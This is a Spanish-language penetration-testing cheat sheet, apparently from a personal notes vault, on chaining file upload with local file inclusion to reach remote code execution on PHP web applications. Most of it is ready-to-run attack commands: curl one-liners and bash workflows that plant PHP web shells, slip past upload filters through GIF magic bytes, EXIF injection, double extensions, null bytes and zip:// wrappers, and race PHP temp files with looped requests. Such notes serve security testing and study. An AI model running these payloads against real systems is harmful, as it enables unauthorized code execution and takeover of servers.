---
aliases: null
tags:
  - type/technique
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI To RCE - File Upload + LFI

***

## Cheatsheet

| **Payload / Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -F 'file=@shell.php' https://target/upload && curl 'https://target/?page=/var/www/uploads/shell.php&cmd=id'` | Upload directo + include | App acepta `.php` directo. |
| `curl -F 'file=@shell.phar' https://target/upload && curl 'https://target/?page=/var/www/uploads/shell.phar&cmd=id'` | Upload con ext alternativa PHP | Blacklist solo bloquea `.php`. |
| `printf 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.php && curl -F 'file=@shell.php' https://target/upload` | Magic bytes GIF + PHP — pasa validación de imagen | Validación `file`/`mime_content_type`. |
| `cp legit.jpg poly.jpg && exiftool -Comment='<?php system($_GET["cmd"]); ?>' poly.jpg && curl -F 'file=@poly.jpg' https://target/upload && curl '?page=/uploads/poly.jpg&cmd=id'` | PHP en EXIF de JPEG real → LFI ejecuta | Whitelist + `getimagesize()` strict. |
| `curl -F 'file=@shell.php.jpg' https://target/upload && curl '?page=/uploads/shell.php.jpg&cmd=id'` | Doble extensión | Blacklist regex débil. |
| `curl -F 'file=@shell.php%00.jpg' https://target/upload && curl '?page=/uploads/shell.php&cmd=id'` | Null byte trunca extensión | PHP <5.3.4. |
| `python3 -c "import zipfile; z=zipfile.ZipFile('p.zip','w'); z.writestr('shell.php','<?php system(\$_GET[\"cmd\"]); ?>'); z.close()" && curl -F 'file=@p.zip' https://target/upload && curl 'https://target/?page=zip:///var/www/uploads/p.zip%23shell.php&cmd=id'` | ZIP con PHP adentro + wrapper `zip://` | Whitelist solo `.zip`, server soporta `zip://`. |
| Race condition contra `/tmp/php<XXXXXX>` mientras upload en curso | Incluir archivo temporal antes de que PHP lo borre | App rechaza upload pero el temp file existe brevemente. |
| `curl -F 'file=@shell.php' https://target/upload -H 'Content-Type: image/jpeg'` (con magic bytes) + `curl '?page=...'` | Bypass Content-Type + magic bytes | Combo. |
^lfi-fileupload

### Workflow estándar

```bash
TARGET="https://target"
UPLOAD="$TARGET/upload"
INCLUDE="$TARGET/?page=PAYLOAD"

# 1. Crear shell con magic bytes
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.jpg

# 2. Subir
curl -F 'file=@shell.jpg' "$UPLOAD" -v 2>&1 | grep -i 'location\|url'

# 3. Localizar path en response
# Buscar src="/uploads/...", o /files/, /static/, etc.

# 4. Si LFI tiene append .php, usar null byte o wrapper
curl -s "${INCLUDE//PAYLOAD/..%2Fuploads%2Fshell.jpg&cmd=id}"
```

### Workflow EXIF chain

```bash
# 1. Imagen real
cp /usr/share/icons/HighContrast/128x128/apps/firefox.png legit.png
file legit.png  # → PNG image data

# 2. Inyectar PHP en EXIF (PNG usa tEXt chunk, JPEG usa Comment)
# JPEG:
cp legit.jpg poly.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' poly.jpg

# 3. Subir (pasa whitelist .jpg)
curl -F 'file=@poly.jpg' https://target/upload

# 4. Ejecutar via LFI
curl 'https://target/?page=/var/www/uploads/poly.jpg&cmd=id'
```

### Workflow ZIP wrapper

```bash
# 1. ZIP con PHP adentro
python3 <<'EOF'
import zipfile
with zipfile.ZipFile('payload.zip', 'w') as z:
    z.writestr('shell.php', '<?php system($_GET["cmd"]); ?>')
EOF

# 2. Subir
curl -F 'file=@payload.zip' https://target/upload

# 3. Ejecutar via zip:// wrapper (# URL-encoded como %23)
curl 'https://target/?page=zip:///var/www/uploads/payload.zip%23shell.php&cmd=id'
```

### Workflow race condition contra /tmp

```bash
# Cuando app SUBE pero borra el archivo rápido (validación falla post-upload)
# PHP guarda en /tmp/phpXXXXXX antes de procesarlo

# Terminal 1: spam upload
while true; do
  curl -F 'file=@shell.php' https://target/upload &
done

# Terminal 2: spam include con brute-force de nombres
for i in $(seq 1 1000); do
  RAND=$(python3 -c "import string,random;print(''.join(random.choices(string.ascii_lowercase+string.digits,k=6)))")
  curl -s "https://target/?page=/tmp/php$RAND&cmd=id" &
done
wait
```

___

## Overview

Vector más versátil de LFI → RCE. Combina upload (con o sin validaciones) + LFI conocido.

**Estrategias por tipo de validación de upload:**

| Validación | Bypass |
|:---:|:---:|
| Solo `.php` blacklisted | `.phar`/`.phtml`/`.php5`/`.inc` |
| Magic bytes | Prefijo `GIF89a;` + PHP payload |
| `getimagesize()` strict | Payload en EXIF de imagen real (chain con LFI) |
| Whitelist solo imagen | SVG con `<?php` o JPEG con EXIF poison |
| Filename strict | ZIP/PHAR upload + wrapper |
| Borra archivos inválidos | Race condition contra `/tmp/php*` |

Ver [[File Upload - Bypass de Filtros de Lista Negra]] / [[File Upload - Bypass de Filtros de Lista Blanca]] / [[File Upload - Bypass de Contenido]] para más bypasses de upload.

***
